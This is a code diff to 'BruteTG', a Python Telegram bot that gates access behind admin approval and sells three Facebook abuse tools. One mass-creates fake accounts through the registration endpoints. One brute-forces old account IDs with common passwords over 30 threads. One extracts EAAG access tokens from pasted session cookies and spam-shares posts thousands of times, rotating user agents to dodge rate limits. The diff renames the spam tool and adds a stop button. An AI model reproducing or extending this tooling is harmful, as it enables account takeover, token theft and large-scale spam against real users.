@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 BruteTG — Telegram Bot with Admin-Approved Access
-Tools: AU2 FM Maker | FB Clone (Brute) | NIKA Spam Share
+Tools: AU2 FM Maker | FB Clone (Brute) | Spam Share
 """
 
 from __future__ import annotations
@@ -64,6 +64,9 @@ except Exception:
 # ─── Global event-loop reference (set in post_init) ──────────────────────────
 _bot_loop: asyncio.AbstractEventLoop | None = None
 
+# ─── Stop flags — keyed by chat_id. Set True to stop a running job. ──────────
+_stop_flags: dict[int, bool] = {}
+
 # ─── Thread-safe Telegram sender ─────────────────────────────────────────────
 def tg_send(bot, chat_id: int, text: str, parse_mode: str = "Markdown",
             reply_markup=None, timeout: int = 30):
@@ -118,8 +121,8 @@ def tg_typing(bot, chat_id: int):
 # ─── In-memory sessions ───────────────────────────────────────────────────────
 sessions: dict[str, dict] = {}
 
-# ─── NIKA UA pool (from zip exact) ───────────────────────────────────────────
-NIKA_UA_LIST = [
+# ─── Spam Share UA pool ───────────────────────────────────────────────────────
+SPAM_UA_LIST = [
     "Mozilla/5.0 (Linux; Android 12; OnePlus 9 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.11.118;]",
     "Mozilla/5.0 (Linux; Android 13; Google Pixel 6a Build/TQ3A.230605.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/340.0.0.15.119;]",
     "Mozilla/5.0 (Linux; Android 11; SM-G998B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.12.120;]",
@@ -203,6 +206,12 @@ def spinner_frames(n: int, total: int) -> str:
     bar = "█" * pct + "░" * (20 - pct)
     return f"{frames[n % len(frames)]} `[{bar}]` `{n}/{total}`"
 
+# ─── Stop keyboard helper ─────────────────────────────────────────────────────
+def stop_keyboard(chat_id: int, tool: str) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(f"🛑 Stop {tool}", callback_data=f"stop_{chat_id}_{tool}")]
+    ])
+
 # ─── API helpers ──────────────────────────────────────────────────────────────
 def api_req(method: str, path: str, **kwargs) -> requests.Response:
     url = f"{API_BASE}{path}"
@@ -255,7 +264,7 @@ WELCOME_BANNER = (
     "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
     "🔨 *AU2 FM Maker* — FB Account Creator\n"
     "🔓 *FB Clone* — Old Account Brute Crack\n"
-    "📤 *NIKA Spam Share* — Cookie Post Sharer\n"
+    "📤 *Spam Share* — Cookie Post Sharer\n"
     "━━━━━━━━━━━━━━━━━━━━━━━━━━"
 )
 
@@ -270,7 +279,7 @@ def tools_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("🔨 AU2 FM Maker",            callback_data="tool_au2")],
         [InlineKeyboardButton("🔓 FB Clone (Brute Crack)",  callback_data="tool_fbclone")],
-        [InlineKeyboardButton("📤 NIKA Spam Share",         callback_data="tool_nika")],
+        [InlineKeyboardButton("📤 Spam Share",              callback_data="tool_spam")],
         [InlineKeyboardButton("📊 My Status",               callback_data="tool_status")],
     ])
 
@@ -425,11 +434,22 @@ async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         "/menu     — Open the tools menu\n"
         "/au2      — AU2 FM Maker (FB account creator)\n"
         "/fbclone  — FB Clone brute crack\n"
-        "/nika     — NIKA Spam Share (cookie post sharer)\n"
+        "/spam     — Spam Share (cookie post sharer)\n"
+        "/stop     — Stop any running tool\n"
         "/logout   — Log out\n"
         "/help     — This help message",
         parse_mode="Markdown",
     )
+
+# ─── /stop ────────────────────────────────────────────────────────────────────
+async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
+    chat_id = update.effective_chat.id
+    _stop_flags[chat_id] = True
+    await update.message.reply_text(
+        "🛑 *Stop signal sent!*\n\nThe current operation will stop after the next iteration.",
+        parse_mode="Markdown",
+    )
+    return STATE_AUTHENTICATED
 
 # ─── Keyboard handler ─────────────────────────────────────────────────────────
 async def handle_keyboard(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
@@ -454,7 +474,7 @@ async def handle_keyboard(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int
     tool = ctx.user_data.get("active_tool")
     if tool == "au2":    return await handle_au2_input(update, ctx)
     if tool == "fbclone": return await handle_clone_input(update, ctx)
-    if tool == "nika":   return await handle_nika_input(update, ctx)
+    if tool == "spam":   return await handle_spam_input(update, ctx)
 
     await update.message.reply_text("Use /menu to see tools.")
     return STATE_AUTHENTICATED
@@ -464,12 +484,22 @@ async def handle_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int
     query = update.callback_query
     await query.answer()
     tg_id = str(query.from_user.id)
+    chat_id = query.message.chat_id
 
     if not sessions.get(tg_id, {}).get("verified"):
         await query.edit_message_text("❌ Session expired. Use /start.")
         return STATE_AUTHENTICATED
 
     data = query.data
+
+    # Stop button handler
+    if data and data.startswith("stop_"):
+        _stop_flags[chat_id] = True
+        await query.edit_message_text(
+            "🛑 *Stop signal sent!*\n\nThe operation will stop after the current iteration.",
+            parse_mode="Markdown",
+        )
+        return STATE_AUTHENTICATED
 
     if data == "tool_au2":
         ctx.user_data.update({"active_tool": "au2", "au2_step": "contact_type"})
@@ -497,17 +527,17 @@ async def handle_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int
         )
         return STATE_AUTHENTICATED
 
-    elif data == "tool_nika":
+    elif data == "tool_spam":
         ctx.user_data.update({
-            "active_tool": "nika",
-            "nika_step": "cookie_count",
-            "nika_tokens": [],
-            "nika_cookies_list": [],
-            "nika_cookie_idx": 0,
-            "nika_total_cookies": 0,
+            "active_tool": "spam",
+            "spam_step": "cookie_count",
+            "spam_tokens": [],
+            "spam_cookies_list": [],
+            "spam_cookie_idx": 0,
+            "spam_total_cookies": 0,
         })
         await query.edit_message_text(
-            "📤 *NIKA Spam Share*\n"
+            "📤 *Spam Share*\n"
             "Cookie-Based Facebook Post Sharer\n\n"
             "Supports multiple cookies for high-speed sharing.\n\n"
             "How many cookies to use? (1-10)\n\n"
@@ -540,7 +570,7 @@ async def handle_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  AU2 FM MAKER — Facebook Account Creator (NO LIMITS, from zip)
+#  AU2 FM MAKER — Facebook Account Creator (NO LIMITS)
 # ══════════════════════════════════════════════════════════════════════════════
 
 async def cmd_au2(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
@@ -629,6 +659,7 @@ def _launch_au2(update: Update, ctx: ContextTypes.DEFAULT_TYPE, tg_id: str, user
     pw      = ctx.user_data.get("au2_pw", gen_password())
     bot     = ctx.application.bot
     chat_id = update.effective_chat.id
+    _stop_flags[chat_id] = False
     threading.Thread(
         target=run_au2,
         args=(bot, chat_id, tg_id, username, contact, count, pw),
@@ -638,10 +669,9 @@ def _launch_au2(update: Update, ctx: ContextTypes.DEFAULT_TYPE, tg_id: str, user
 
 def run_au2(bot, chat_id: int, tg_id: str, username: str,
             contact: str, count: int, pw: str):
-    """AU2 FM Maker — full account creation logic from zip. Runs in background thread."""
+    """AU2 FM Maker — runs in background thread. Only shows OK accounts."""
     contact_label = {"1":"BD Number","2":"Mix Country Number","3":"Temp Email"}.get(contact,"?")
 
-    # Send start message and get its ID for live editing
     msg = tg_send(
         bot, chat_id,
         f"🔨 *AU2 FM Maker Starting...*\n"
@@ -651,18 +681,30 @@ def run_au2(bot, chat_id: int, tg_id: str, username: str,
         f"🔑 Password: `{pw}`\n\n"
         f"⣾ `[░░░░░░░░░░░░░░░░░░░░]` `0/{count}`\n"
         f"⏳ Starting...",
+        reply_markup=stop_keyboard(chat_id, "AU2"),
     )
     progress_msg_id = msg.message_id if msg else None
     log_activity(tg_id, username, "AU2", "start", f"count={count} contact={contact}")
 
-    ok_list  = []
-    cp_list  = []
-    fail_list = []
-    reg_url  = "https://m.facebook.com/reg/"
-    sub_url  = "https://www.facebook.com/reg/submit/"
+    ok_list   = []
+    cp_count  = 0
+    fail_count = 0
+    reg_url   = "https://m.facebook.com/reg/"
+    sub_url   = "https://www.facebook.com/reg/submit/"
     last_edit = time.time()
 
     for i in range(count):
+        if _stop_flags.get(chat_id):
+            tg_send(bot, chat_id,
+                f"🛑 *AU2 FM Maker Stopped*\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"✅ *Created:* `{len(ok_list)}`\n"
+                f"🔢 *Tried:*  `{i}`\n\n"
+                "Use /menu to run another tool.",
+            )
+            _stop_flags.pop(chat_id, None)
+            return
+
         tg_typing(bot, chat_id)
         try:
             ses  = requests.Session()
@@ -720,8 +762,8 @@ def run_au2(bot, chat_id: int, tg_id: str, username: str,
 
             if "c_user" in cki:
                 uid  = cki["c_user"]
-                cstr = "; ".join(f"{k}={v}" for k, v in cki.items())
                 ok_list.append(f"{uid}|{pw}|{contact_val}")
+                # Only show OK accounts
                 tg_send(
                     bot, chat_id,
                     f"✅ *[{i+1}/{count}] Account Created!*\n"
@@ -731,25 +773,16 @@ def run_au2(bot, chat_id: int, tg_id: str, username: str,
                     f"📞 Contact:  `{contact_val}`\n"
                     f"🔑 Password: `{pw}`\n"
                     f"🎂 DOB:      `{bday}/{bmon}/{byear}`\n"
-                    f"✅ OK: `{len(ok_list)}`  ⚠️ CP: `{len(cp_list)}`",
+                    f"✅ Total OK: `{len(ok_list)}`",
                 )
                 log_activity(tg_id, username, "AU2", "ok", f"uid={uid}", ok=True)
 
             elif "checkpoint" in cki or (hasattr(sub, "url") and "checkpoint" in sub.url):
-                cp_list.append(contact_val)
-                tg_send(bot, chat_id,
-                    f"⚠️ *[{i+1}/{count}] Checkpoint hit*\n"
-                    f"📞 `{contact_val}`\n"
-                    f"✅ OK: `{len(ok_list)}`  ⚠️ CP: `{len(cp_list)}`",
-                )
+                cp_count += 1
                 log_activity(tg_id, username, "AU2", "checkpoint", contact_val, ok=False)
 
             else:
-                fail_list.append(contact_val)
-                tg_send(bot, chat_id,
-                    f"❌ *[{i+1}/{count}] Failed*\n"
-                    f"📞 `{contact_val}`",
-                )
+                fail_count += 1
 
             # Update progress bar every 5 accounts
             if progress_msg_id and (i + 1) % 5 == 0 and time.time() - last_edit > 2:
@@ -762,8 +795,8 @@ def run_au2(bot, chat_id: int, tg_id: str, username: str,
                     f"🔑 Password: `{pw}`\n\n"
                     f"{spinner_frames(i+1, count)}\n"
                     f"✅ OK: `{len(ok_list)}`  "
-                    f"⚠️ CP: `{len(cp_list)}`  "
-                    f"❌ Fail: `{len(fail_list)}`",
+                    f"⚠️ CP: `{cp_count}`  "
+                    f"❌ Fail: `{fail_count}`",
                 )
                 last_edit = time.time()
 
@@ -771,26 +804,25 @@ def run_au2(bot, chat_id: int, tg_id: str, username: str,
 
         except Exception as e:
             log.warning("AU2 error #%d: %s", i+1, e)
-            fail_list.append("error")
-            tg_send(bot, chat_id, f"⚠️ [{i+1}/{count}] Error: `{str(e)[:80]}`")
+            fail_count += 1
             time.sleep(5)
 
-    # Final summary
     tg_send(
         bot, chat_id,
         f"🏁 *AU2 FM Maker — DONE!*\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"✅ *Created:*    `{len(ok_list)}`\n"
-        f"⚠️ *Checkpoint:* `{len(cp_list)}`\n"
-        f"❌ *Failed:*     `{len(fail_list)}`\n"
+        f"⚠️ *Checkpoint:* `{cp_count}`\n"
+        f"❌ *Failed:*     `{fail_count}`\n"
         f"🔢 *Total run:*  `{count}`\n\n"
         "Use /menu to run another tool.",
     )
-    log_activity(tg_id, username, "AU2", "done", f"ok={len(ok_list)} cp={len(cp_list)}")
+    log_activity(tg_id, username, "AU2", "done", f"ok={len(ok_list)} cp={cp_count}")
+    _stop_flags.pop(chat_id, None)
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  FB CLONE — Old Account Brute Crack (NO LIMITS, from zip)
+#  FB CLONE — Old Account Brute Crack (NO LIMITS)
 # ══════════════════════════════════════════════════════════════════════════════
 
 async def cmd_fbclone(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
@@ -856,6 +888,7 @@ async def handle_clone_input(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> 
         method  = text
         bot     = ctx.application.bot
         chat_id = update.effective_chat.id
+        _stop_flags[chat_id] = False
         threading.Thread(
             target=run_fbclone,
             args=(bot, chat_id, tg_id, username, series, count, method),
@@ -897,7 +930,7 @@ def estimate_year(uid: str) -> str:
 
 
 def _clone_m1(uid: str) -> tuple:
-    """Method 1 — b-graph.facebook.com (from zip fbclone_login_1)."""
+    """Method 1 — b-graph.facebook.com."""
     ses = requests.Session()
     try:
         for pw in ("123456","1234567","12345678","123456789"):
@@ -956,7 +989,7 @@ def _clone_m1(uid: str) -> tuple:
 
 
 def _clone_m2(uid: str) -> tuple:
-    """Method 2 — b-api.facebook.com (from zip fbclone_login_2)."""
+    """Method 2 — b-api.facebook.com."""
     for pw in ("123456","123123","1234567","12345678","123456789"):
         try:
             with requests.Session() as ses:
@@ -990,7 +1023,7 @@ def _clone_m2(uid: str) -> tuple:
 
 def run_fbclone(bot, chat_id: int, tg_id: str, username: str,
                 series: str, count: int, method: str):
-    """FB Clone brute — runs entirely in background thread, no async needed."""
+    """FB Clone brute — runs entirely in background thread."""
     series_label = {"A":"All (2010-2014)","B":"100003/4 Series","C":"2009 Series"}.get(series,series)
     msg = tg_send(
         bot, chat_id,
@@ -1002,6 +1035,7 @@ def run_fbclone(bot, chat_id: int, tg_id: str, username: str,
         f"🧵 Threads: `30`\n\n"
         f"⣾ `[░░░░░░░░░░░░░░░░░░░░]` `0/{count}`\n"
         f"🔍 Searching...",
+        reply_markup=stop_keyboard(chat_id, "FBClone"),
     )
     progress_msg_id = msg.message_id if msg else None
     log_activity(tg_id, username, "FBCLONE", "start", f"series={series} count={count} m={method}")
@@ -1015,6 +1049,18 @@ def run_fbclone(bot, chat_id: int, tg_id: str, username: str,
     with ThreadPoolExecutor(max_workers=30) as pool:
         futures = {pool.submit(clone_fn, uid): uid for uid in uids}
         for future in as_completed(futures):
+            if _stop_flags.get(chat_id):
+                pool.shutdown(wait=False, cancel_futures=True)
+                tg_send(bot, chat_id,
+                    f"🛑 *FB Clone Stopped*\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"✅ *Cracked:* `{len(ok_list)}`\n"
+                    f"🔢 *Tried:*  `{done}`\n\n"
+                    "Use /menu to run another tool.",
+                )
+                _stop_flags.pop(chat_id, None)
+                return
+
             done += 1
             try:
                 found, uid, pw = future.result()
@@ -1034,7 +1080,6 @@ def run_fbclone(bot, chat_id: int, tg_id: str, username: str,
             except Exception:
                 pass
 
-            # Update progress bar every 100 UIDs
             if progress_msg_id and done % 100 == 0 and time.time() - last_edit > 3:
                 tg_edit(
                     bot, chat_id, progress_msg_id,
@@ -1056,23 +1101,27 @@ def run_fbclone(bot, chat_id: int, tg_id: str, username: str,
         "Use /menu to run another tool.",
     )
     log_activity(tg_id, username, "FBCLONE", "done", f"cracked={len(ok_list)} tried={count}")
+    _stop_flags.pop(chat_id, None)
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  NIKA — Spam Share (Cookie-Based Post Sharer, NO LIMITS, from zip)
+#  SPAM SHARE — Cookie-Based Post Sharer (NO LIMITS)
 # ══════════════════════════════════════════════════════════════════════════════
 
-async def cmd_nika(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
+async def cmd_spam(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
     tg_id = str(update.effective_user.id)
     if not sessions.get(tg_id, {}).get("verified"):
         await update.message.reply_text("❌ Not authenticated. Use /start."); return ConversationHandler.END
     ctx.user_data.update({
-        "active_tool": "nika", "nika_step": "cookie_count",
-        "nika_tokens": [], "nika_cookies_list": [],
-        "nika_cookie_idx": 0, "nika_total_cookies": 0,
+        "active_tool": "spam",
+        "spam_step": "cookie_count",
+        "spam_tokens": [],
+        "spam_cookies_list": [],
+        "spam_cookie_idx": 0,
+        "spam_total_cookies": 0,
     })
     await update.message.reply_text(
-        "📤 *NIKA Spam Share*\n"
+        "📤 *Spam Share*\n"
         "Cookie-Based Facebook Post Sharer\n\n"
         "Supports multiple cookies for high-speed sharing.\n\n"
         "How many cookies to use? (1-10)\n\n"
@@ -1082,22 +1131,21 @@ async def cmd_nika(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
     return STATE_AUTHENTICATED
 
 
-async def handle_nika_input(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
+async def handle_spam_input(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
     tg_id    = str(update.effective_user.id)
     username = sessions.get(tg_id, {}).get("username","")
-    step     = ctx.user_data.get("nika_step","")
+    step     = ctx.user_data.get("spam_step","")
     text     = update.message.text.strip()
 
-    # Step 1 — how many cookies
     if step == "cookie_count":
         try:
             n = int(text)
             if n < 1 or n > 10: raise ValueError
         except ValueError:
             await update.message.reply_text("❌ Enter a number between 1 and 10."); return STATE_AUTHENTICATED
-        ctx.user_data["nika_total_cookies"] = n
-        ctx.user_data["nika_cookie_idx"]    = 1
-        ctx.user_data["nika_step"]          = "cookie_input"
+        ctx.user_data["spam_total_cookies"] = n
+        ctx.user_data["spam_cookie_idx"]    = 1
+        ctx.user_data["spam_step"]          = "cookie_input"
         await update.message.reply_text(
             f"🍪 *Cookie #1 of {n}*\n\n"
             "Paste your Facebook session cookie string:\n"
@@ -1106,12 +1154,10 @@ async def handle_nika_input(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> i
         )
         return STATE_AUTHENTICATED
 
-    # Step 2 — collect each cookie & extract EAAG token
     elif step == "cookie_input":
-        idx   = ctx.user_data.get("nika_cookie_idx", 1)
-        total = ctx.user_data.get("nika_total_cookies", 1)
+        idx   = ctx.user_data.get("spam_cookie_idx", 1)
+        total = ctx.user_data.get("spam_total_cookies", 1)
 
-        # Parse cookie string
         cookies: dict[str, str] = {}
         for part in text.split(";"):
             part = part.strip()
@@ -1130,14 +1176,13 @@ async def handle_nika_input(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> i
             f"⏳ Extracting EAAG token from cookie #{idx}..."
         )
 
-        # Extract token in a thread (blocking HTTP)
         token = await asyncio.get_event_loop().run_in_executor(
-            None, _extract_nika_token, cookies
+            None, _extract_spam_token, cookies
         )
 
         if token:
-            ctx.user_data["nika_tokens"].append(token)
-            ctx.user_data["nika_cookies_list"].append(cookies)
+            ctx.user_data["spam_tokens"].append(token)
+            ctx.user_data["spam_cookies_list"].append(cookies)
             await processing_msg.edit_text(
                 f"✅ *Cookie #{idx}* — Token extracted!\n`{token[:30]}...`",
                 parse_mode="Markdown",
@@ -1150,21 +1195,20 @@ async def handle_nika_input(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> i
             )
 
         if idx < total:
-            ctx.user_data["nika_cookie_idx"] = idx + 1
+            ctx.user_data["spam_cookie_idx"] = idx + 1
             await update.message.reply_text(
                 f"🍪 *Cookie #{idx+1} of {total}*\n\nPaste next cookie:",
                 parse_mode="Markdown",
             )
             return STATE_AUTHENTICATED
 
-        # All cookies collected
-        tokens = ctx.user_data.get("nika_tokens",[])
+        tokens = ctx.user_data.get("spam_tokens",[])
         if not tokens:
-            await update.message.reply_text("❌ No valid cookies. Use /nika to try again.")
+            await update.message.reply_text("❌ No valid cookies. Use /spam to try again.")
             ctx.user_data.pop("active_tool", None)
             return STATE_AUTHENTICATED
 
-        ctx.user_data["nika_step"] = "link"
+        ctx.user_data["spam_step"] = "link"
         await update.message.reply_text(
             f"✅ *{len(tokens)} valid token(s) ready!*\n\n"
             "📎 Now paste the *Facebook post URL* to spam share:\n\n"
@@ -1174,7 +1218,6 @@ async def handle_nika_input(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> i
         )
         return STATE_AUTHENTICATED
 
-    # Step 3 — post URL
     elif step == "link":
         if not text.startswith("http") or "facebook.com" not in text.lower():
             await update.message.reply_text(
@@ -1183,8 +1226,8 @@ async def handle_nika_input(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> i
                 parse_mode="Markdown",
             )
             return STATE_AUTHENTICATED
-        ctx.user_data["nika_link"] = text
-        ctx.user_data["nika_step"] = "count"
+        ctx.user_data["spam_link"] = text
+        ctx.user_data["spam_step"] = "count"
         await update.message.reply_text(
             "🔢 *How many times to share?*\n\n"
             "_No limit — you decide how many (e.g. 100, 1000, 5000, 50000)_\n\n"
@@ -1193,7 +1236,6 @@ async def handle_nika_input(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> i
         )
         return STATE_AUTHENTICATED
 
-    # Step 4 — share count → launch
     elif step == "count":
         try:
             n = int(text)
@@ -1201,34 +1243,34 @@ async def handle_nika_input(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> i
         except ValueError:
             await update.message.reply_text("❌ Enter a valid positive number."); return STATE_AUTHENTICATED
 
-        link    = ctx.user_data.get("nika_link","")
-        tokens  = ctx.user_data.get("nika_tokens",[])
-        cookies = ctx.user_data.get("nika_cookies_list",[])
-        ctx.user_data["nika_step"] = None
+        link    = ctx.user_data.get("spam_link","")
+        tokens  = ctx.user_data.get("spam_tokens",[])
+        cookies = ctx.user_data.get("spam_cookies_list",[])
+        ctx.user_data["spam_step"] = None
         ctx.user_data.pop("active_tool", None)
 
         bot     = ctx.application.bot
         chat_id = update.effective_chat.id
-
+        _stop_flags[chat_id] = False
         threading.Thread(
-            target=run_nika,
+            target=run_spam,
             args=(bot, chat_id, tg_id, username, tokens, cookies, link, n),
             daemon=True,
         ).start()
         return STATE_AUTHENTICATED
 
-    await update.message.reply_text("Unknown step. Use /nika to restart.")
+    await update.message.reply_text("Unknown step. Use /spam to restart.")
     return STATE_AUTHENTICATED
 
 
-def _extract_nika_token(cookies: dict) -> str | None:
-    """Extract EAAG token from Facebook business page (from zip nika_login)."""
+def _extract_spam_token(cookies: dict) -> str | None:
+    """Extract EAAG token from Facebook business page."""
     try:
         ses = requests.Session()
         r = ses.get(
             "https://business.facebook.com/business_locations",
             headers={
-                "user-agent":      random.choice(NIKA_UA_LIST),
+                "user-agent":      random.choice(SPAM_UA_LIST),
                 "referer":         "https://www.facebook.com/",
                 "host":            "business.facebook.com",
                 "origin":          "https://business.facebook.com",
@@ -1248,15 +1290,15 @@ def _extract_nika_token(cookies: dict) -> str | None:
     return None
 
 
-def _nika_share_once(token: str, cookie: dict, link: str,
+def _spam_share_once(token: str, cookie: dict, link: str,
                      account_shares: dict, failed_accounts: set) -> bool:
-    """Single share attempt — from zip nika_share_post logic exactly."""
+    """Single share attempt."""
     if token in failed_accounts:
         return False
 
-    for attempt in range(20):  # 20 retries (from zip)
+    for attempt in range(20):
         try:
-            ua = random.choice(NIKA_UA_LIST)
+            ua = random.choice(SPAM_UA_LIST)
             if any(k in link.lower() for k in ("video","reel","watch")):
                 headers = {
                     "authority":        "graph.facebook.com",
@@ -1307,36 +1349,49 @@ def _nika_share_once(token: str, cookie: dict, link: str,
     return False
 
 
-def run_nika(bot, chat_id: int, tg_id: str, username: str,
+def run_spam(bot, chat_id: int, tg_id: str, username: str,
              tokens: list, cookies_list: list, link: str, limit: int):
-    """NIKA spam share — fully synchronous, runs in background thread."""
+    """Spam Share — fully synchronous, runs in background thread."""
     msg = tg_send(
         bot, chat_id,
-        f"📤 *NIKA Spam Share Starting...*\n"
+        f"📤 *Spam Share Starting...*\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🍪 Cookies/Tokens: `{len(tokens)}`\n"
         f"🔗 Link: `{link[:60]}{'...' if len(link)>60 else ''}`\n"
         f"🔢 Target shares: `{limit}`\n\n"
         f"⣾ `[░░░░░░░░░░░░░░░░░░░░]` `0/{limit}`\n"
         f"⚙️ Warming up threads...",
+        reply_markup=stop_keyboard(chat_id, "SpamShare"),
     )
     progress_msg_id = msg.message_id if msg else None
-    log_activity(tg_id, username, "NIKA", "start", f"limit={limit} cookies={len(tokens)}")
+    log_activity(tg_id, username, "SPAM", "start", f"limit={limit} cookies={len(tokens)}")
 
     account_shares: dict[str, int] = {t: 0 for t in tokens}
     failed_accounts: set[str] = set()
     start_time    = time.time()
     success_count = 0
     fail_count    = 0
-    per_acct_max  = 60   # cooldown threshold per account (from zip)
+    per_acct_max  = 60
     last_edit     = time.time()
     last_progress = 0
 
     for n in range(1, limit + 1):
-        # Pick available token (least shares, not failed)
+        if _stop_flags.get(chat_id):
+            elapsed = int(time.time() - start_time)
+            mins, secs = divmod(elapsed, 60)
+            tg_send(bot, chat_id,
+                f"🛑 *Spam Share Stopped*\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"✅ *Shared:* `{success_count}`\n"
+                f"🔢 *Target:* `{limit}`\n"
+                f"⏱️ *Time:*   `{mins}m {secs}s`\n\n"
+                "Use /menu to run another tool.",
+            )
+            _stop_flags.pop(chat_id, None)
+            return
+
         available = [t for t in tokens if account_shares.get(t,0) < per_acct_max and t not in failed_accounts]
         if not available:
-            # Reset counters and take 10s cooldown (from zip)
             time.sleep(10)
             for t in tokens:
                 if t not in failed_accounts:
@@ -1349,26 +1404,24 @@ def run_nika(bot, chat_id: int, tg_id: str, username: str,
         token  = min(available, key=lambda t: account_shares.get(t,0))
         cookie = cookies_list[tokens.index(token)]
 
-        ok = _nika_share_once(token, cookie, link, account_shares, failed_accounts)
+        ok = _spam_share_once(token, cookie, link, account_shares, failed_accounts)
         if ok:
             success_count += 1
         else:
             fail_count += 1
 
-        time.sleep(0.1)  # 0.1s delay per share (from zip)
+        time.sleep(0.1)
 
-        # Cooldown every 60 shares (from zip)
         if n % 60 == 0:
             time.sleep(10)
 
-        # Update progress bar every 50 shares
         if n - last_progress >= 50 and time.time() - last_edit > 2:
             elapsed = int(time.time() - start_time)
             mins, secs = divmod(elapsed, 60)
             rate = round(success_count / max(elapsed, 1) * 60, 1)
             tg_send(
                 bot, chat_id,
-                f"📊 *NIKA Progress Update*\n"
+                f"📊 *Spam Share Progress*\n"
                 f"━━━━━━━━━━━━━━━━━━━━\n"
                 f"{spinner_frames(n, limit)}\n"
                 f"✅ Shared:  `{success_count}`\n"
@@ -1384,7 +1437,7 @@ def run_nika(bot, chat_id: int, tg_id: str, username: str,
     mins, secs = divmod(elapsed, 60)
     tg_send(
         bot, chat_id,
-        f"🏁 *NIKA Spam Share — DONE!*\n"
+        f"🏁 *Spam Share — DONE!*\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"✅ *Shared:*  `{success_count}`\n"
         f"❌ *Failed:*  `{fail_count}`\n"
@@ -1392,7 +1445,8 @@ def run_nika(bot, chat_id: int, tg_id: str, username: str,
         f"⏱️ *Time:*    `{mins}m {secs}s`\n\n"
         "Use /menu to run another tool.",
     )
-    log_activity(tg_id, username, "NIKA", "done", f"ok={success_count} fail={fail_count}")
+    log_activity(tg_id, username, "SPAM", "done", f"ok={success_count} fail={fail_count}")
+    _stop_flags.pop(chat_id, None)
 
 
 # ─── /logout ──────────────────────────────────────────────────────────────────
@@ -1418,7 +1472,7 @@ async def fallback_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> in
     tool = ctx.user_data.get("active_tool")
     if tool == "au2":     return await handle_au2_input(update, ctx)
     if tool == "fbclone": return await handle_clone_input(update, ctx)
-    if tool == "nika":    return await handle_nika_input(update, ctx)
+    if tool == "spam":    return await handle_spam_input(update, ctx)
     await update.message.reply_text("Unknown command. Use /menu to see tools or /help.")
     return STATE_AUTHENTICATED
 
@@ -1473,7 +1527,9 @@ def main():
                 CommandHandler("logout",  cmd_logout),
                 CommandHandler("au2",     cmd_au2),
                 CommandHandler("fbclone", cmd_fbclone),
-                CommandHandler("nika",    cmd_nika),
+                CommandHandler("spam",    cmd_spam),
+                CommandHandler("nika",    cmd_spam),   # backward compat alias
+                CommandHandler("stop",    cmd_stop),
                 CommandHandler("help",    cmd_help),
                 CallbackQueryHandler(handle_callback),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, handle_keyboard),
@@ -1482,6 +1538,7 @@ def main():
         fallbacks=[
             CommandHandler("logout", cmd_logout),
             CommandHandler("start",  cmd_start),
+            CommandHandler("stop",   cmd_stop),
         ],
         allow_reentry=True,
         per_message=False,
@@ -1490,6 +1547,7 @@ def main():
     app.add_handler(conv)
     app.add_handler(CommandHandler("status", cmd_status))
     app.add_handler(CommandHandler("help",   cmd_help))
+    app.add_handler(CommandHandler("stop",   cmd_stop))
     app.add_handler(CallbackQueryHandler(handle_callback))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, fallback_message))
 
